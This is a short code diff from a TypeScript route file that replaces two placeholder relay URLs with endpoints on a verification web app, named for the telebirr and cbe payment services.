@@ -3,8 +3,8 @@ import { getRelayerUrl } from "@/lib/store";
 
 export const dynamic = "force-dynamic";
 
-const RELAY_URL_1 = "https://spotify.com";
-const RELAY_URL_2 = "https://youtube.com";
+const RELAY_URL_1 = "https://verification-six-gilt.vercel.app/telebirr";
+const RELAY_URL_2 = "https://verification-six-gilt.vercel.app/cbe";
 
 function parseSlot(v: unknown): 1 | 2 | 3 {
   const n = Number(v);
